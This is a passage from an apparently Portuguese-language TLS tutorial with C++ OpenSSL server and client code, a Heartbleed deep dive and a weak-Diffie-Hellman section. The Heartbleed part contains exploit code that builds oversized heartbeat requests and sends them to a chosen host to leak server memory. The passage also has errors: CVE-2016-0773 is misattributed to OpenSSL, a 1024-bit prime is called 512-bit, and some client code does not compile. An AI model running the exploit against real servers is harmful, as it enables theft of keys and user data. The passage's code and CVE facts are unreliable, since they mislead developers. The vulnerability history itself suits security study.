        if (SSL_CTX_set_min_proto_version(ctx_, TLS1_3_VERSION) != 1) {
            print_ssl_errors("Falha ao configurar versão mínima");
            return false;
        }

        if (SSL_CTX_set_max_proto_version(ctx_, TLS1_3_VERSION) != 1) {
            print_ssl_errors("Falha ao configurar versão máxima");
            return false;
        }

        return true;
    }

    bool configure_ciphers() {
        const char* ciphersuites = config_.cipher_suites.empty() ?
            "TLS_AES_256_GCM_SHA384:"
            "TLS_CHACHA20_POLY1305_SHA256:"
            "TLS_AES_128_GCM_SHA256" :
            config_.cipher_suites.c_str();

        if (SSL_CTX_set_ciphersuites(ctx_, ciphersuites) != 1) {
            print_ssl_errors("Falha ao configurar cifras TLS 1.3");
            return false;
        }

        return true;
    }

    bool configure_groups() {
        const char* groups = config_.groups.empty() ?
            "X25519:P-256:P-384:P-521" :
            config_.groups.c_str();

        if (SSL_CTX_set1_groups_list(ctx_, groups) != 1) {
            print_ssl_errors("Falha ao configurar grupos de curvas");
            return false;
        }

        return true;
    }

    bool load_credentials() {
        // Carregar certificado
        if (SSL_CTX_use_certificate_chain_file(ctx_, config_.cert_path.c_str()) != 1) {
            print_ssl_errors("Falha ao carregar certificado: " + config_.cert_path);
            return false;
        }

        // Carregar chave privada
        if (SSL_CTX_use_PrivateKey_file(ctx_, config_.key_path.c_str(),
                                          SSL_FILETYPE_PEM) != 1) {
            print_ssl_errors("Falha ao carregar chave: " + config_.key_path);
            return false;
        }

        // Verificar se chave corresponde ao certificado
        if (SSL_CTX_check_private_key(ctx_) != 1) {
            print_ssl_errors("Chave não corresponde ao certificado");
            return false;
        }

        // Carregar CA para verificação de cliente (se necessário)
        if (!config_.ca_path.empty()) {
            if (SSL_CTX_load_verify_locations(ctx_, config_.ca_path.c_str(),
                                                nullptr) != 1) {
                print_ssl_errors("Falha ao carregar CA: " + config_.ca_path);
                return false;
            }
        }

        std::cout << "Credenciais carregadas com sucesso\n";
        return true;
    }

    void accept_loop() {
        while (running_) {
            struct pollfd pfd;
            pfd.fd = listen_fd_;
            pfd.events = POLLIN;

            int ret = poll(&pfd, 1, 1000);  // 1 segundo timeout

            if (ret < 0) {
                if (errno == EINTR) continue;
                perror("poll");
                break;
            }

            if (ret == 0) continue;  // Timeout

            // Aceitar conexão
            struct sockaddr_in client_addr;
            socklen_t addr_len = sizeof(client_addr);

            int client_fd = accept(listen_fd_, (struct sockaddr*)&client_addr, &addr_len);
            if (client_fd < 0) {
                perror("accept");
                continue;
            }

            // Criar thread para tratar a conexão
            std::thread(&Tls13Server::handle_connection, this,
                        client_fd, client_addr).detach();
        }
    }

    void handle_connection(int client_fd, struct sockaddr_in client_addr) {
        // Criar objeto SSL
        SSL* ssl = SSL_new(ctx_);
        if (!ssl) {
            close(client_fd);
            return;
        }

        // Associar socket
        SSL_set_fd(ssl, client_fd);

        // Adicionar ao gerenciador de conexões
        if (!connection_manager_.add_connection(client_fd, ssl, client_addr)) {
            std::cerr << "Limite de conexões atingido\n";
            SSL_free(ssl);
            close(client_fd);
            return;
        }

        auto conn = connection_manager_.get_connection(client_fd);

        // Aceitar handshake TLS 1.3
        int ret = SSL_accept(ssl);
        if (ret != 1) {
            int err = SSL_get_error(ssl, ret);
            print_ssl_connection_error(err, conn->client_ip);
            cleanup_connection(client_fd, ssl);
            return;
        }

        // Verificar versão negociada
        int version = SSL_version(ssl);
        if (version != TLS1_3_VERSION) {
            std::cerr << "AVISO: TLS 1.3 não foi negociado para "
                      << conn->client_ip << "\n";
        }

        // Log de conexão bem-sucedida
        const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl);
        std::cout << "Conexão estabelecida:\n";
        std::cout << "  Cliente: " << conn->client_ip << "\n";
        std::cout << "  Protocolo: " << SSL_get_version(ssl) << "\n";
        std::cout << "  Cifra: " << (cipher ? SSL_CIPHER_get_name(cipher) : "unknown") << "\n";

        // Processar requisições HTTP
        process_http_requests(ssl, conn);

        // Cleanup
        cleanup_connection(client_fd, ssl);
    }

    void process_http_requests(SSL* ssl, ConnectionManager::Connection* conn) {
        char buffer[8192];

        while (running_) {
            int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);

            if (bytes <= 0) {
                int err = SSL_get_error(ssl, bytes);
                if (err == SSL_ERROR_ZERO_RETURN) {
                    // Conexão fechada normalmente
                    break;
                }
                if (err == SSL_ERROR_WANT_READ || err == SSL_ERROR_WANT_WRITE) {
                    continue;
                }
                // Erro
                break;
            }

            conn->bytes_received += bytes;
            buffer[bytes] = '\0';

            std::string request(buffer, bytes);

            // Verificar se é uma requisição HTTP completa
            if (request.find("\r\n\r\n") == std::string::npos) {
                // Requisição incompleta, continuar lendo
                continue;
            }

            // Processar requisição
            std::string response = request_handler_.handle_request(request);

            // Enviar resposta
            int written = SSL_write(ssl, response.data(), response.size());
            if (written <= 0) {
                break;
            }

            conn->bytes_sent += written;

            // Se Connection: close, fechar
            if (request.find("Connection: close") != std::string::npos) {
                break;
            }
        }
    }

    void cleanup_connection(int fd, SSL* ssl) {
        connection_manager_.remove_connection(fd);
        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(fd);
    }

    void print_ssl_errors(const std::string& msg) const {
        std::cerr << msg << "\n";
        ERR_print_errors_fp(stderr);
    }

    void print_ssl_connection_error(int err, const std::string& client_ip) const {
        switch (err) {
            case SSL_ERROR_SSL:
                std::cerr << "Erro SSL com " << client_ip << ": ";
                ERR_print_errors_fp(stderr);
                break;
            case SSL_ERROR_SYSCALL:
                std::cerr << "Erro de sistema com " << client_ip
                          << ": " << strerror(errno) << "\n";
                break;
            case SSL_ERROR_ZERO_RETURN:
                std::cerr << "Conexão fechada por " << client_ip << "\n";
                break;
            default:
                std::cerr << "Erro SSL " << err << " com " << client_ip << "\n";
        }
    }

    static void new_session_callback(SSL* ssl, SSL_SESSION* session) {
        std::cout << "Nova sessão TLS 1.3 criada\n";
    }

    static void remove_session_callback(SSL_CTX* ctx, SSL_SESSION* session) {
        std::cout << "Sessão removida do cache\n";
    }
};

// ============================================================
// Função Principal
// ============================================================

void signal_handler(int sig) {
    std::cout << "\nSinal " << sig << " recebido, encerrando...\n";
    // Em produção: usar flag atômica para parar o servidor
}

int main(int argc, char* argv[]) {
    // Configurar signal handler
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    // OpenSSL init
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    // Configuração padrão
    ServerConfig config;
    config.cert_path = "server.crt";
    config.key_path = "server.key";
    config.port = 4433;
    config.enable_0rtt = false;

    // Parse de argumentos simples
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--cert" && i + 1 < argc) {
            config.cert_path = argv[++i];
        } else if (arg == "--key" && i + 1 < argc) {
            config.key_path = argv[++i];
        } else if (arg == "--port" && i + 1 < argc) {
            config.port = std::stoi(argv[++i]);
        } else if (arg == "--enable-0rtt") {
            config.enable_0rtt = true;
            config.max_early_data = 16384;
        } else if (arg == "--help") {
            std::cout << "Uso: " << argv[0] << " [opções]\n";
            std::cout << "  --cert <arquivo>  Certificado TLS\n";
            std::cout << "  --key <arquivo>   Chave privada\n";
            std::cout << "  --port <porta>    Porta (default: 4433)\n";
            std::cout << "  --enable-0rtt     Habilitar 0-RTT\n";
            return 0;
        }
    }

    // Criar e inicializar servidor
    Tls13Server server(config);

    if (!server.initialize()) {
        std::cerr << "Falha ao inicializar servidor\n";
        return 1;
    }

    std::cout << "=== Servidor TLS 1.3 Iniciado ===\n";
    std::cout << "Porta: " << config.port << "\n";
    std::cout << "0-RTT: " << (config.enable_0rtt ? "habilitado" : "desabilitado") << "\n";
    std::cout << "Ctrl+C para encerrar\n";

    // Iniciar servidor
    server.start();

    return 0;
}
```

---

## 10. Complete C++17 TLS Client Implementation

```c++
// tls_client.cpp - Cliente TLS 1.3 completo em C++17 com OpenSSL 3.x
// Compilar: g++ -std=c++17 -o tls_client tls_client.cpp -lssl -lcrypto -pthread

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509.h>
#include <openssl/x509v3.h>
#include <openssl/pem.h>
#include <openssl/core_names.h>

#include <iostream>
#include <memory>
#include <string>
#include <vector>
#include <map>
#include <thread>
#include <mutex>
#include <atomic>
#include <functional>
#include <chrono>
#include <cstring>
#include <sstream>

#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <fcntl.h>

// ============================================================
// Configuração do Cliente
// ============================================================

struct ClientConfig {
    std::string host;
    int port{4433};
    std::string cert_path;
    std::string key_path;
    std::string ca_path;
    bool verify_server{true};
    bool enable_0rtt{false};
    size_t max_early_data{0};
    std::string cipher_suites;
    std::string groups;
    int timeout_seconds{30};
};

// ============================================================
// Resultado de Conexão
// ============================================================

struct ConnectionResult {
    bool success;
    std::string protocol_version;
    std::string cipher_suite;
    int cipher_bits;
    std::string server_name;
    std::string error_message;
    std::chrono::milliseconds handshake_duration;
};

// ============================================================
// Cliente TLS 1.3
// ============================================================

class Tls13Client {
public:
    Tls13Client(const ClientConfig& config)
        : config_(config), ctx_(nullptr), ssl_(nullptr) {}

    ~Tls13Client() {
        disconnect();
    }

    ConnectionResult connect() {
        ConnectionResult result;
        result.success = false;

        auto start_time = std::chrono::steady_clock::now();

        // Criar contexto TLS
        ctx_ = SSL_CTX_new(TLS_client_method());
        if (!ctx_) {
            result.error_message = "Falha ao criar SSL_CTX";
            return result;
        }

        // Configurar contexto
        if (!configure_context()) {
            result.error_message = last_error_;
            return result;
        }

        // Criar socket
        sockfd_ = create_socket(config_.host, config_.port);
        if (sockfd_ < 0) {
            result.error_message = "Falha ao criar socket: " + last_error_;
            return result;
        }

        // Criar objeto SSL
        ssl_ = SSL_new(ctx_);
        if (!ssl_) {
            result.error_message = "Falha ao criar objeto SSL";
            close(sockfd_);
            return result;
        }

        // Configurar SNI
        if (!SSL_set_tlsext_host_name(ssl_, config_.host.c_str())) {
            result.error_message = "Falha ao configurar SNI";
            cleanup();
            return result;
        }

        // Configurar verificação de hostname
        SSL_set1_host(ssl_, config_.host.c_str());

        // Associar socket
        SSL_set_fd(ssl_, sockfd_);

        // Habilitar 0-RTT se configurado
        if (config_.enable_0rtt) {
            SSL_set_early_data_enabled(ssl_, 1);
        }

        // Realizar handshake
        int ret = SSL_connect(ssl_);
        if (ret != 1) {
            int err = SSL_get_error(ssl_, ret);
            result.error_message = get_ssl_error_string(err);
            cleanup();
            return result;
        }

        auto end_time = std::chrono::steady_clock::now();
        result.handshake_duration = std::chrono::duration_cast<std::chrono::milliseconds>(
            end_time - start_time);

        // Coletar informações da conexão
        result.success = true;
        result.protocol_version = SSL_get_version(ssl_);
        result.server_name = config_.host;

        const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl_);
        if (cipher) {
            result.cipher_suite = SSL_CIPHER_get_name(cipher);
            result.cipher_bits = SSL_CIPHER_get_bits(cipher, nullptr);
        }

        return result;
    }

    void disconnect() {
        cleanup();
    }

    // Enviar dados
    bool send_data(const std::vector<uint8_t>& data) {
        if (!ssl_) return false;

        int ret = SSL_write(ssl_, data.data(), data.size());
        if (ret <= 0) {
            int err = SSL_get_error(ssl_, ret);
            last_error_ = get_ssl_error_string(err);
            return false;
        }

        bytes_sent_ += ret;
        return true;
    }

    bool send_string(const std::string& data) {
        return send_data(std::vector<uint8_t>(data.begin(), data.end()));
    }

    // Receber dados
    std::vector<uint8_t> receive_data(size_t max_size = 8192) {
        if (!ssl_) return {};

        std::vector<uint8_t> buffer(max_size);
        int ret = SSL_read(ssl_, buffer.data(), buffer.size());

        if (ret > 0) {
            buffer.resize(ret);
            bytes_received_ += ret;
            return buffer;
        }

        return {};
    }

    std::string receive_string(size_t max_size = 8192) {
        auto data = receive_data(max_size);
        return std::string(data.begin(), data.end());
    }

    // Enviar requisição HTTP
    std::string send_http_request(const std::string& method,
                                    const std::string& path,
                                    const std::string& body = "",
                                    const std::map<std::string, std::string>& headers = {}) {
        std::ostringstream request;

        // Request line
        request << method << " " << path << " HTTP/1.1\r\n";

        // Headers
        request << "Host: " << config_.host << "\r\n";
        request << "User-Agent: TLS13-Client/1.0\r\n";
        request << "Accept: */*\r\n";

        for (const auto& [key, value] : headers) {
            request << key << ": " << value << "\r\n";
        }

        if (!body.empty()) {
            request << "Content-Length: " << body.size() << "\r\n";
            request << "Content-Type: application/json\r\n";
        }

        request << "Connection: keep-alive\r\n";
        request << "\r\n";

        if (!body.empty()) {
            request << body;
        }

        std::string req_str = request.str();

        // Enviar
        if (!send_string(req_str)) {
            return "";
        }

        // Receber resposta
        return receive_string();
    }

    // Obter informações da conexão
    void print_connection_info() const {
        if (!ssl_) return;

        std::cout << "\n=== Informações da Conexão TLS 1.3 ===\n";
        std::cout << "Host: " << config_.host << ":" << config_.port << "\n";
        std::cout << "Protocolo: " << SSL_get_version(ssl_) << "\n";

        const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl_);
        if (cipher) {
            std::cout << "Cifra: " << SSL_CIPHER_get_name(cipher) << "\n";
            std::cout << "Bits: " << SSL_CIPHER_get_bits(cipher, nullptr) << "\n";
        }

        // Verificar certificado do servidor
        X509* peer_cert = SSL_get_peer_certificate(ssl_);
        if (peer_cert) {
            char subject[256], issuer[256];
            X509_NAME_oneline(X509_get_subject_name(peer_cert), subject, sizeof(subject));
            X509_NAME_oneline(X509_get_issuer_name(peer_cert), issuer, sizeof(issuer));

            std::cout << "Certificado do servidor:\n";
            std::cout << "  Subject: " << subject << "\n";
            std::cout << "  Issuer: " << issuer << "\n";

            X509_free(peer_cert);
        }

        std::cout << "Bytes enviados: " << bytes_sent_ << "\n";
        std::cout << "Bytes recebidos: " << bytes_received_ << "\n";
        std::cout << "=======================================\n";
    }

    // Verificar se Early Data foi aceito
    bool was_early_data_accepted() const {
        if (!ssl_) return false;
        return SSL_get_early_data_status(ssl_) == SSL_EARLY_DATA_ACCEPTED;
    }

    // Enviar dados com 0-RTT
    bool send_early_data(const std::vector<uint8_t>& data) {
        if (!ssl_ || !config_.enable_0rtt) return false;

        size_t bytes_written = 0;
        int ret = SSL_write_early_data(ssl_, data.data(), data.size(), &bytes_written);

        if (ret == 1) {
            bytes_sent_ += bytes_written;
            return true;
        }

        int err = SSL_get_error(ssl_, ret);
        last_error_ = get_ssl_error_string(err);
        return false;
    }

private:
    ClientConfig config_;
    SSL_CTX* ctx_;
    SSL* ssl_;
    int sockfd_{-1};
    std::string last_error_;
    uint64_t bytes_sent_{0};
    uint64_t bytes_received_{0};

    bool configure_context() {
        // TLS 1.3 como versão mínima e máxima
        if (SSL_CTX_set_min_proto_version(ctx_, TLS1_3_VERSION) != 1) {
            last_error_ = "Falha ao configurar versão mínima";
            return false;
        }

        if (SSL_CTX_set_max_proto_version(ctx_, TLS1_3_VERSION) != 1) {
            last_error_ = "Falha ao configurar versão máxima";
            return false;
        }

        // Configurar cifras
        const char* ciphersuites = config_.cipher_suites.empty() ?
            "TLS_AES_256_GCM_SHA384:"
            "TLS_CHACHA20_POLY1305_SHA256:"
            "TLS_AES_128_GCM_SHA256" :
            config_.cipher_suites.c_str();

        if (SSL_CTX_set_ciphersuites(ctx_, ciphersuites) != 1) {
            last_error_ = "Falha ao configurar cifras";
            return false;
        }

        // Configurar grupos de curvas
        const char* groups = config_.groups.empty() ?
            "X25519:P-256:P-384:P-521" :
            config_.groups.c_str();

        if (SSL_CTX_set1_groups_list(ctx_, groups) != 1) {
            last_error_ = "Falha ao configurar grupos";
            return false;
        }

        // Configurar verificação de certificado
        if (config_.verify_server) {
            SSL_CTX_set_verify(ctx_, SSL_VERIFY_PEER, nullptr);

            if (!config_.ca_path.empty()) {
                if (SSL_CTX_load_verify_locations(ctx_, config_.ca_path.c_str(),
                                                    nullptr) != 1) {
                    // Tentar CA bundle do sistema
                    if (SSL_CTX_set_default_verify_paths(ctx_) != 1) {
                        last_error_ = "Falha ao configurar CA";
                        return false;
                    }
                }
            } else {
                // Usar CA bundle do sistema
                if (SSL_CTX_set_default_verify_paths(ctx_) != 1) {
                    last_error_ = "Falha ao carregar CA do sistema";
                    return false;
                }
            }
        } else {
            SSL_CTX_set_verify(ctx_, SSL_VERIFY_NONE, nullptr);
        }

        // Configurar 0-RTT
        if (config_.enable_0rtt) {
            SSL_CTX_set_max_early_data(ctx_, config_.max_early_data);
        }

        // Configurar ALPN
        const unsigned char alpn[] = {2, 'h', '2', 8, 'h', 't', 't', 'p', '/', '1', '.', '1'};
        SSL_CTX_set_alpn_protos(ctx_, alpn, sizeof(alpn));

        // Configurar modo SSL
        SSL_CTX_set_mode(ctx_,
            SSL_MODE_ENABLE_PARTIAL_WRITE |
            SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER |
            SSL_MODE_AUTO_RETRY);

        return true;
    }

    int create_socket(const std::string& host, int port) {
        struct addrinfo hints, *result;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;

        std::string port_str = std::to_string(port);
        int ret = getaddrinfo(host.c_str(), port_str.c_str(), &hints, &result);
        if (ret != 0) {
            last_error_ = "Falha ao resolver host: " + host;
            return -1;
        }

        int sockfd = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
        if (sockfd < 0) {
            freeaddrinfo(result);
            last_error_ = "Falha ao criar socket";
            return -1;
        }

        // Configurar TCP_NODELAY para latência mínima
        int flag = 1;
        setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));

        // Configurar timeout
        struct timeval tv;
        tv.tv_sec = config_.timeout_seconds;
        tv.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        // Conectar
        ret = connect(sockfd, result->ai_addr, result->ai_addrlen);
        freeaddrinfo(result);

        if (ret < 0) {
            close(sockfd);
            last_error_ = "Falha ao conectar: " + std::string(strerror(errno));
            return -1;
        }

        return sockfd;
    }

    void cleanup() {
        if (ssl_) {
            SSL_shutdown(ssl_);
            SSL_free(ssl_);
            ssl_ = nullptr;
        }

        if (ctx_) {
            SSL_CTX_free(ctx_);
            ctx_ = nullptr;
        }

        if (sockfd_ >= 0) {
            close(sockfd_);
            sockfd_ = -1;
        }
    }

    std::string get_ssl_error_string(int err) const {
        switch (err) {
            case SSL_ERROR_SSL:
                return "Erro SSL interno";
            case SSL_ERROR_SYSCALL:
                return "Erro de sistema: " + std::string(strerror(errno));
            case SSL_ERROR_ZERO_RETURN:
                return "Conexão fechada pelo servidor";
            case SSL_ERROR_WANT_READ:
                return "Aguardando dados para leitura";
            case SSL_ERROR_WANT_WRITE:
                return "Aguardando dados para escrita";
            default:
                return "Erro SSL desconhecido: " + std::to_string(err);
        }
    }
};

// ============================================================
// Função Principal
// ============================================================

int main(int argc, char* argv[]) {
    // OpenSSL init
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    // Configuração padrão
    ClientConfig config;
    config.host = "localhost";
    config.port = 4433;
    config.verify_server = false;  // Para testes locais

    // Parse de argumentos
    for (int i = 1; i < argc; ++i) {
        std::string arg = argv[i];
        if (arg == "--host" && i + 1 < argc) {
            config.host = argv[++i];
        } else if (arg == "--port" && i + 1 < argc) {
            config.port = std::stoi(argv[++i]);
        } else if (arg == "--no-verify") {
            config.verify_server = false;
        } else if (arg == "--enable-0rtt") {
            config.enable_0rtt = true;
            config.max_early_data = 16384;
        } else if (arg == "--help") {
            std::cout << "Uso: " << argv[0] << " [opções]\n";
            std::cout << "  --host <host>      Host para conectar\n";
            std::cout << "  --port <porta>     Porta (default: 4433)\n";
            std::cout << "  --no-verify        Não verificar certificado\n";
            std::cout << "  --enable-0rtt      Habilitar 0-RTT\n";
            return 0;
        }
    }

    // Criar cliente
    Tls13Client client(config);

    std::cout << "Conectando a " << config.host << ":" << config.port << "...\n";

    // Conectar
    ConnectionResult result = client.connect();

    if (!result.success) {
        std::cerr << "Falha na conexão: " << result.error_message << "\n";
        return 1;
    }

    std::cout << "Conexão estabelecida!\n";
    std::cout << "Handshake concluído em " << result.handshake_duration.count() << " ms\n";

    // Imprimir informações
    client.print_connection_info();

    // Testar 0-RTT se habilitado
    if (config.enable_0rtt) {
        std::string early_data = "GET / HTTP/1.1\r\nHost: " + config.host + "\r\n\r\n";
        if (client.send_early_data(std::vector<uint8_t>(early_data.begin(), early_data.end()))) {
            std::cout << "Early Data enviado\n";
        }

        if (client.was_early_data_accepted()) {
            std::cout << "Early Data ACEITO pelo servidor\n";
        } else {
            std::cout << "Early Data NÃO aceito\n";
        }
    }

    // Enviar requisição HTTP de teste
    std::cout << "\nEnviando requisição HTTP...\n";
    std::string response = client.send_http_request("GET", "/");

    if (!response.empty()) {
        std::cout << "\nResposta do servidor:\n";
        std::cout << response.substr(0, 500) << "\n";  // Primeiros 500 chars
    } else {
        std::cerr << "Falha ao receber resposta\n";
    }

    // Estatísticas finais
    std::cout << "\n=== Estatísticas ===\n";
    std::cout << "Total enviado: " << client.send_string("").size() << " bytes\n";

    return 0;
}
```

---

## 11. CVE-2014-0160 (Heartbleed) Deep Dive

### 11.1 O que foi o Heartbleed?

O Heartbleed foi uma vulnerabilidade crítica no OpenSSL, divulgada em 7 de abril de 2014. Afetou o protocolo TLS Heartbeat Extension (RFC 6520) e permitia que atacantes lessem memória do servidor, potencialmente expondo chaves privadas, dados sensíveis e tokens de sessão.

### 11.2 Análise Técnica

A vulnerabilidade estava na implementação do heartbeat no OpenSSL. O protocolo heartbeat permite que um endpoint verifique se o outro ainda está ativo:

```
HeartbeatRequest {
    type: 1 (request)
    payload_length: N
    payload: [N bytes]
}

HeartbeatResponse {
    type: 2 (response)
    payload_length: N
    payload: [N bytes]
}
```

O bug estava na ausência de verificação do campo `payload_length`:

```c
// Código vulnerável (simplificado) em ssl/d1_both.c
int dtls1_process_heartbeat(SSL *s) {
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    unsigned int padding = 16; /* Use minimum padding */

    /* Leia tipo de heartbeat (1 byte) */
    hbtype = *p++;
    /* Leia comprimento do payload (2 bytes) */
    n2s(p, payload);
    /* Apontar para o início do payload */
    pl = p;

    // ... processamento ...

    // BUG: Não verifica se payload > comprimento real dos dados recebidos
    // Permite ler memória além do buffer

    // Responder com os dados
    if (hbtype == TLS1_HB_REQUEST) {
        unsigned char *buffer, *bp;

        // Aloca buffer para resposta
        buffer = OPENSSL_malloc(1 + 2 + payload + padding);
        bp = buffer;

        *bp++ = TLS1_HB_RESPONSE;
        s2n(payload, bp);
        memcpy(bp, pl, payload);  // COPIA payload bytes da memória
        bp += payload;

        // Envia resposta
        dtls1_write_heartbeat(s, buffer, 3 + payload + padding);
        OPENSSL_free(buffer);
    }

    return 0;
}
```

### 11.3 Exploração

```c++
// Demonstração da exploração do Heartbleed (EDUCAÇÃO APENAS)
// NÃO execute em sistemas sem autorização

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/bio.h>

#include <iostream>
#include <vector>
#include <cstring>

class HeartbleedDemonstration {
public:
    // Construir pacote de heartbeat malicioso
    static std::vector<uint8_t> build_malicious_heartbeat(
            uint16_t fake_payload_length) {

        std::vector<uint8_t> packet;

        // TLS Record Header
        packet.push_back(0x18);  // ContentType: Heartbeat (24)
        packet.push_back(0x03);  // Version: TLS 1.1 (compatibilidade)
        packet.push_back(0x02);

        // Comprimento do registro (placeholder)
        uint16_t record_length = 1 + 2 + 16;  // type + length + padding
        packet.push_back((record_length >> 8) & 0xFF);
        packet.push_back(record_length & 0xFF);

        // Heartbeat Message
        packet.push_back(0x01);  // Type: Request

        // PAYLOAD LENGTH: Onde está o bug!
        // Definimos um comprimento MAIOR que o payload real
        packet.push_back((fake_payload_length >> 8) & 0xFF);
        packet.push_back(fake_payload_length & 0xFF);

        // Payload real (apenas 16 bytes de padding)
        for (int i = 0; i < 16; ++i) {
            packet.push_back(0x00);
        }

        return packet;
    }

    // Simular envio de heartbeat malicioso
    static bool demonstrate_vulnerability() {
        std::cout << "=== Demonstração do Heartbleed (CVE-2014-0160) ===\n\n";

        // Construir pacote malicioso
        // Solicitar 64KB de dados (máximo que o bug permite)
        uint16_t fake_length = 65535;
        auto malicious_packet = build_malicious_heartbeat(fake_length);

        std::cout << "Pacote Heartbeat malicioso construído:\n";
        std::cout << "  Tamanho do registro: " << record_length(malicious_packet) << " bytes\n";
        std::cout << "  Payload length declarado: " << fake_length << " bytes\n";
        std::cout << "  Payload real: 16 bytes (apenas padding)\n\n";

        // Em um servidor vulnerável:
        // 1. O servidor recebe o pacote
        // 2. Lê payload_length = 65535
        // 3. NÃO verifica se 65535 <= tamanho real do buffer
        // 4. Copia 65535 bytes da memória (INCLUINDO dados alheios)
        // 5. Envia de volta ao atacante

        std::cout << "O que o servidor faria:\n";
        std::cout << "  1. Ler payload_length = " << fake_length << "\n";
        std::cout << "  2. NÃO verificar se " << fake_length
                  << " <= tamanho real do buffer\n";
        std::cout << "  3. Copiar " << fake_length
                  << " bytes da memória (DADOS ALHEIOS)\n";
        std::cout << "  4. Enviar dados vazados ao atacante\n\n";

        // Dados que poderiam ser vazados:
        std::cout << "Dados potencialmente vazados:\n";
        std::cout << "  - Chaves privadas TLS\n";
        std::cout << "  - Sessões ativas\n";
        std::cout << "  - Dados de autenticação\n";
        std::cout << "  - Tokens e senhas\n";
        std::cout << "  - Dados de outros clientes\n";
        std::cout << "  - Conteúdo de memória do processo\n";

        return true;
    }

    // Verificar se um servidor é vulnerável
    static bool check_vulnerability(const std::string& host, int port) {
        std::cout << "\nVerificando vulnerabilidade em " << host << ":" << port << "\n";

        // Conectar ao servidor
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) return false;

        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        if (BIO_do_connect(bio) <= 0) {
            std::cerr << "Falha ao conectar\n";
            BIO_free(bio);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return false;
        }

        SSL_set_bio(ssl, bio, bio);

        // Tentar handshake
        if (SSL_connect(ssl) != 1) {
            std::cerr << "Falha no handshake\n";
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return false;
        }

        // Enviar heartbeat malicioso
        auto packet = build_malicious_heartbeat(65535);

        // Enviar pacote diretamente via socket
        int sock = SSL_get_fd(ssl);
        send(sock, packet.data(), packet.size(), 0);

        // Tentar ler resposta
        unsigned char buffer[65536];
        int bytes_received = recv(sock, buffer, sizeof(buffer), 0);

        SSL_free(ssl);
        SSL_CTX_free(ctx);

        if (bytes_received > 5) {
            // Verificar se recebemos dados Heartbeat
            if (buffer[0] == 0x18) {  // Heartbeat response
                std::cout << "Servidor VULNERÁVEL ao Heartbleed!\n";
                std::cout << "Recebidos " << bytes_received << " bytes de dados vazados\n";
                return true;
            }
        }

        std::cout << "Servidor parece NÃO vulnerável\n";
        return false;
    }

private:
    static uint16_t record_length(const std::vector<uint8_t>& packet) {
        if (packet.size() < 5) return 0;
        return (packet[3] << 8) | packet[4];
    }
};

// Função principal de demonstração
void demonstrate_heartbleed() {
    HeartbleedDemonstration::demonstrate_vulnerability();
}
```

### 11.4 Impacto e Lições Aprendidas

**Impacto do Heartbleed:**
- Afetou aproximadamente 17% dos servidores TLS da internet
- Chaves privadas de milhares de servidores foram comprometidas
- Muitos certificados tiveram que ser revogados e reemitidos
- Prejuízos estimados em centenas de milhões de dólares

**Lições Aprendidas:**
1. **Validação de entrada é crítica**: Nunca confie em campos de protocolo sem verificar
2. **Memory safety**: Use linguagens ou bibliotecas que ofereçam garantias de segurança de memória
3. **Auditoria de código**: OpenSSL precisava de auditorias regulares
4. **Resposta a incidentes**: Processos claros para divulgação e correção

---

## 12. CVE-2016-0773: OpenSSL Key Recovery

### 12.1 Descrição da Vulnerabilidade

CVE-2016-0773 foi uma vulnerabilidade no OpenSSL que afetava a negociação de Diffie-Hellman (DH) ephemeral. O problema estava na maneira como o OpenSSL tratava parâmetros DH de baixa qualidade (menos de 768 bits).

### 12.2 Análise Técnica

```c++
// Demonstração do problema com DH de baixa qualidade
// CVE-2016-0773

#include <openssl/dh.h>
#include <openssl/bn.h>
#include <openssl/err.h>

#include <iostream>
#include <vector>

class WeakDhDemonstration {
public:
    // Gerar parâmetros DH inseguros (apenas para demonstração)
    static DH* create_weak_dh_params() {
        DH* dh = DH_new();
        if (!dh) return nullptr;

        // Parâmetros de 512 bits - INSEGURO!
        // Em produção, NUNCA use menos de 2048 bits
        BIGNUM* p = BN_new();
        BIGNUM* g = BN_new();

        // Primo de 512 bits (frágil)
        // NOTA: Este é um primo demonstrativo, NÃO use em produção
        BN_hex2bn(&p,
            "FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1"
            "29024E088A67CC74020BBEA63B139B22514A08798E3404DD"
            "EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245"
            "E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED"
            "EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE65381"
            "FFFFFFFFFFFFFFFF");

        BN_set_word(g, 2);

        DH_set0_pqg(dh, p, nullptr, g);

        return dh;
    }

    // Demonstrar como DH de baixa qualidade pode ser quebrado
    static void demonstrate_weak_dh() {
        std::cout << "=== CVE-2016-0773: DH Key Recovery ===\n\n";

        DH* weak_dh = create_weak_dh_params();
        if (!weak_dh) {
            std::cerr << "Falha ao criar parâmetros DH\n";
            return;
        }

        int bits = DH_bits(weak_dh);
